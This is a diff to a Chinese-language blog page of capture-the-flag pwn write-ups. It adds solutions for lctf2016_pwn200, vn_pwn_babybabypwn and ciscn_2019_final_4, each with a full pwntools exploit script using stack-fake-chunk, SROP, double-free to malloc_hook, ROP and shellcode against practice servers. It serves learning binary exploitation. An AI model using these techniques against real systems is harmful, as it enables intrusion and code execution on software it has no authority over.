@@ -121,7 +121,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    6.3k 字
+                    8.8k 字
                   </span>&nbsp;
                 
 
@@ -129,7 +129,7 @@
                   
                   &nbsp;<i class="far fa-clock"></i>
                   <span class="post-count">
-                      33 分钟
+                      45 分钟
                   </span>&nbsp;
                 
 
@@ -1012,6 +1012,7 @@ sla(&#39;biang&#39;,chr((one  &amp;0xff)))
 sla(&#39;biang!&#39;,chr((one &gt;&gt; 8 &amp;0xff)))
 sla(&#39;biang!&#39;,chr((one &gt;&gt; 16 &amp;0xff)))
 itr()</code></pre>
+<h3 id="题记-4"><a href="#题记-4" class="headerlink" title="题记"></a>题记</h3><p>对于修改<code>_dl_fini</code>，又发现了一个很好的参考链接：<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p>
 <h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><ul>
 <li>开头mmap 一段内存 rwx</li>
 <li>libc 2.27的off by null</li>
@@ -1129,7 +1130,7 @@ edit(10,p64(mmap) + &#39;\n&#39;)
 add(0x200)
 # debug()
 itr()</code></pre>
-<h3 id="题记-4"><a href="#题记-4" class="headerlink" title="题记"></a>题记</h3><p>这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。</p>
+<h3 id="题记-5"><a href="#题记-5" class="headerlink" title="题记"></a>题记</h3><p>这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。</p>
 <p>另外一种解法，就是攻击stdout，泄漏libc地址，然后攻击malloc hook。</p>
 <h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>32位，单次格式化字符串的利用。无法一次性的获得shell。至少运行2次。</p>
 <p>攻击<code>__do_global_dtors_aux_fini_array_entry</code>，让其再次运行一次，且同时改 printf got 的值为system plt。然后送一个 <code>/bin/sh\x00</code>即可。</p>
@@ -1140,6 +1141,339 @@ sleep(1)
 sa(&#39;name&#39;,&#39;/bin/sh\x00&#39;)
 itr()</code></pre>
 <p>因为是32位，用<code>fmtstr_payload</code>是很好用的。</p>
+<h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>开头不输入<code>\n</code>，48字符可以泄露出stack地址</li>
+<li>有第一段可控的栈，且可以覆盖到heap ptr</li>
+</ul>
+<pre><code class="c">int sub_400A29()
+{
+  char buf; // [rsp+0h] [rbp-40h]
+  char *dest; // [rsp+38h] [rbp-8h]
+
+  dest = (char *)malloc(0x40uLL);
+  puts(&quot;give me money~&quot;);
+  read(0, &amp;buf, 0x40uLL);
+  strcpy(dest, &amp;buf);
+  ptr = dest;
+  return sub_4009C4();
+}</code></pre>
+<ul>
+<li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li>
+</ul>
+<p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p>
+<h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
+<li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li>
+<li>申请同大小的堆，改ret address jmp 到 shellcode</li>
+</ul>
+<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *
+import time
+local_file  = &#39;./pwn200&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,26670)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,data):
+    sla(&#39;choice&#39;,&#39;1&#39;)
+    sla(&#39;long&#39;,str(size))
+    sa(&#39;me&#39;,str(data))
+
+def free():
+    sla(&#39;choice&#39;,&#39;2&#39;)
+
+shellcode = asm(shellcraft.sh())
+sa(&#39;u&#39;,shellcode)
+ru(&#39;\x05&#39;)
+leak_stack = uu64(r(6))
+info_addr(&#39;leak_stack&#39;,leak_stack)
+shellcode_addr = leak_stack - 0x50
+# debug()
+sla(&#39;id&#39;,&#39;65&#39;)
+payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90)
+sa(&#39;money&#39;,payload)
+free()
+payload = p64(0)*3 + p64(shellcode_addr)
+add(0x38,payload)
+sleep(0.2)
+sla(&#39;choice&#39;,&#39;3&#39;)
+# debug()
+itr()</code></pre>
+<h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>开了沙盒保护，只能orw</li>
+<li>开始给了libc地址</li>
+<li>程序主要执行了<code>rt_sigreturn</code>，肯定是奔着srop去的</li>
+</ul>
+<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul>
+<li>orw的rop应该往哪里写，栈地址是不知道的</li>
+</ul>
+<p>可以在libc上找一段无用的地方进行写即可。比如 libc的bss，free hook段。</p>
+<ul>
+<li>有的gadget 使用ropgadget找不到</li>
+</ul>
+<pre><code class="python">libc.search(asm(&quot;syscall \nret&quot;)).next() </code></pre>
+<p>可以通过机器码来找。</p>
+<ul>
+<li>srop 中frame执行的顺序</li>
+</ul>
+<p>frame.rip 是先执行的地址。而 frame.rsp 的值就是我们执行完 frame.rip 后，要执行的值</p>
+<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *
+import time
+local_file  = &#39;./vn_pwn_babybabypwn&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 0
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,25535)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
+rce18 = [0x4f2c5,0x4f322,0x10a38c]
+realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
+arae18 = 0x3ebca0
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+&#39;
+line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
+ 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015
+ 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015
+ 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015
+ 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015
+ 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015
+ 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015
+ 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015
+ 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015
+ 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015
+ 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0015: 0x06 0x00 0x00 0x00000000  return KILL
+&#39;
+
+ru(&#39;0x&#39;)
+libc_base =  int(r(12),16) - libc.sym[&#39;puts&#39;]
+info_addr(&#39;libc_base&#39;,libc_base)
+
+free_hook = 0x3c67a8 + libc_base
+read = libc.sym[&#39;read&#39;] + libc_base
+puts = libc.sym[&#39;puts&#39;] + libc_base
+open = libc.sym[&#39;open&#39;] + libc_base
+pop_rdi= 0x0000000000021102 + libc_base
+pop_rsi = 0x00000000000202e8 + libc_base
+pop_rdx = 0x0000000000001b92 + libc_base
+syscall_ret = libc.search(asm(&quot;syscall \nret&quot;)).next() + libc_base
+# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; 
+frame = SigreturnFrame()
+frame.rax = 0
+frame.rdi = 0
+frame.rsi = free_hook
+frame.rdx = 0x300
+frame.rip = syscall_ret
+frame.rsp = free_hook
+payload = str(frame)[8:] #前8字节是rt_sigreturn 其并不需要伪造。程序是主动调用的 sigreturn
+
+# print(hex(len(frame)))
+
+s(payload)
+orw = flat([
+    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,
+    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,
+    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,
+    pop_rdi,free_hook,puts
+])
+
+s(orw)
+sleep(0.2)
+s(&#39;./flag&#39;)
+# debug()
+itr()</code></pre>
+<h3 id="题记-6"><a href="#题记-6" class="headerlink" title="题记"></a>题记</h3><pre><code class="python">payload = str(frame)[8:] </code></pre>
+<p>对于为什么要从8字节开始的理解？</p>
+<p>前8字节是<code>rt_sigreturn</code>,其有什么用？</p>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p>
+<p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用sigreturn系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用,把原来保存的寄存器信息弹回去，最后恢复进程的执行。</p>
+<p>由此可以得出，因为程序是主动调用sigreturn的，并不需要<code>rt_sigreturn</code>指向一段代码，再调用sigreturn系统调用。</p>
+<h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>这个题还是很好的题目，考察了很多的基础知识点。</p>
+<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul>
+<li>开启了沙盒禁用execve</li>
+<li>开头让你输入name，有一段可控的栈空间，且较大</li>
+<li>pie保护没有开</li>
+<li>存在反调试，使用ptrace做的，直接gdb attach过去会进入子程序，看不到堆情况(直接在fork 汇编处，改汇编，<code>jmp 到程序输出字符串的地方即可</code> )</li>
+<li>watch函数中也用ptrace，监视了<code>open，mmap，fork，vfork，ptrace</code> </li>
+</ul>
+<pre><code class="c">while ( 1 )
+  {
+    ptrace(PTRACE_SYSCALL, a1, 0LL, 0LL);
+    waitpid(a1, &amp;stat_loc, 0);
+    if ( !(stat_loc &amp; 0x7F) || (char)((char)((stat_loc &amp; 0x7F) + 1) &gt;&gt; 1) &gt; 0 || (stat_loc &amp; 0xFF00) &gt;&gt; 8 != 5 )
+      break;
+    ptrace(PTRACE_GETREGS, a1, 0LL, &amp;v3);
+    v2 = v4;
+    if ( v4 == 2 || v2 == 9 || v2 == 0x39 || v2 == 0x3A || v2 == 0x65 )
+    {
+      puts(&quot;hey! what are you doing?&quot;);
+      exit(-1);
+    }
+  }</code></pre>
+<p>这里可以监视一下execve，好像就可以不用开沙箱了。</p>
+<h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>存在uaf</p>
+<h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><h4 id="orw的rop-chain往哪里读"><a href="#orw的rop-chain往哪里读" class="headerlink" title="orw的rop chain往哪里读"></a>orw的rop chain往哪里读</h4><p>程序自身是存在较少的gadgets的，想直接完成orw 的rop chain，是不可能的。<br>上来因为没开pie，能简单的完成一个read功能。在泄漏libc以后，就有更大的发挥空间了。</p>
+<p>开头name有一大块可控地址，该怎么使用上。先输入一段垃圾数据，留着寻找。</p>
+<pre><code class="python">sa(&#39;name&#39;,&#39;chumen77&#39;*10)</code></pre>
+<p>在控制malloc hook后，随意写个地址，让其crash在这里，查看下栈地址：</p>
+<pre><code class="python">data = 3 * &#39;\x00&#39; + p64(0xdeadbeef)
+add(0x68,data)</code></pre>
+<p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>发现断在0xdeadbeef，栈上可以看到输入的name情况。</p>
+<p>此处来一个栈劫持，增加rsp 指针0x38 ，接着ret上去，就可以执行name上的东西，这个东西肯定写成仅能完成的read rop chain。</p>
+<p>因为pie没开，可以使用这个新的read 在bss段上读取一个新的rop chain，接着ret 上去执行。新的rop chain，可以为mprotect解开bss段的执行权限，接着跳上orw flag的shellcode即可。（<strong>mprotect 需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 这里直接设置为bss起始地址即可。</strong>）</p>
+<h4 id="open被禁用了怎么办"><a href="#open被禁用了怎么办" class="headerlink" title="open被禁用了怎么办"></a>open被禁用了怎么办</h4><p>可以使用openat进行代替。</p>
+<pre><code class="c">
+#include &lt;fcntl.h&gt;
+
+int open(const char *path, int oflag, mode_t mode);
+int openat(int fd, const char *path, int oflag,  mode_t mode );
+        //函数执行成功返回文件描述符，失败返回-1.</code></pre>
+<p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p>
+<p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p>
+<p>其中重点就是，当openat的path参数，输入是绝对地址时，fd就会被无视，其函数就相当于open了。所以此处的fd，也是可以设成任意值。</p>
+<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
+# encoding: utf-8
+from pwn import *
+import time
+local_file  = &#39;./ciscn_final_4&#39;
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+debug = 1
+if debug:
+    io = process(local_file)
+    libc = elf.libc
+else:
+    io = remote(&#39;node3.buuoj.cn&#39;,25080)
+    libc = elf.libc
+    #libc = ELF(&#39;.&#39;)
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
+#,&#39;&#39;splitw&#39;,&#39;-h&#39;
+s      = lambda data               :io.send(data) 
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r      = lambda numb=4096          :io.recv(numb)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
+itr     = lambda                    :io.interactive()
+def debug():
+    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
+    gdb.attach(io)
+    pause()
+
+def add(size,data):
+    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
+    sla(&#39;size&#39;,str(size))    
+    sa(&#39;tent&#39;,str(data))
+
+def free(idx):
+    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)
+    sla(&#39;index&#39;,str(idx))
+
+def show(idx):
+    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)
+    sla(&#39;index&#39;,str(idx))
+bss = 0x6021C0
+pop_rdi = 0x0000000000401193
+pop_rsi_r15 = 0x0000000000401191
+pop_rsp_r13_r14_r15 = 0x000000000040118d
+orw = flat([pop_rdi,0,pop_rsi_r15,bss + 0x400,0,elf.plt[&#39;read&#39;],pop_rsp_r13_r14_r15,bss + 0x400,0,0,0])
+sa(&#39;name&#39;,str(orw))
+# sa(&#39;name&#39;,&#39;chumen77&#39;*10)
+add(0x1000,&#39;1&#39;)
+add(0x10,&#39;2&#39;)
+free(0)
+show(0)
+r()
+libcbase = uu64(r(6)) - 0x3c4b78
+info_addr(&#39;libcbase&#39;,libcbase)
+add(0x68,&#39;3&#39;)
+add(0x68,&#39;4&#39;)
+add(0x68,&#39;5&#39;)
+free(2)
+free(3)
+free(2)
+malloc_hook = 0x3c4afd + libcbase
+add(0x68,p64(malloc_hook))
+add(0x68,&#39;7&#39;)
+add(0x68,&#39;8&#39;)
+rsp_add_0x38 = libc.search(asm(&quot;add rsp , 0x38\nret&quot;)).next()
+data = 3 * &#39;\x00&#39; + p64(rsp_add_0x38 + libcbase)
+# data = 3 * &#39;\x00&#39; + p64(0xdeadbeef)
+add(0x68,data)
+# debug()
+sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
+sla(&#39;size&#39;,&#39;20&#39;)
+sleep(0.2)
+pop_rdx = libcbase + libc.search(asm(&quot;pop rdx\nret&quot;)).next()
+pop_rsp = libcbase + libc.search(asm(&quot;pop rsp\nret&quot;)).next()
+mprotect = libcbase + libc.sym[&#39;mprotect&#39;]
+payload = flat([pop_rdi,0x00602000,pop_rsi_r15,0x1000,0,pop_rdx,7,mprotect,0x602628])
+shellcode = shellcraft.linux.openat(0,&#39;/flag&#39;,0) + shellcraft.linux.read(3,bss+0x200,0x30) + shellcraft.linux.write(1,bss+0x200,0x30)
+sleep(0.2)
+s(p64(0)*3 + payload + p64(0) + asm(shellcode))
+# debug()
+itr()</code></pre>
+<h3 id="延伸做法"><a href="#延伸做法" class="headerlink" title="延伸做法"></a>延伸做法</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p>
+<p>其是用<code>house_of_orange+setcontext+0x35</code>调用read传入ropchain来完成攻击。</p>
+<p>如果无法控制<code>free_hook</code>且在libc-2.23情况下可以利用这个办法。</p>
 
             <hr>
           </div>
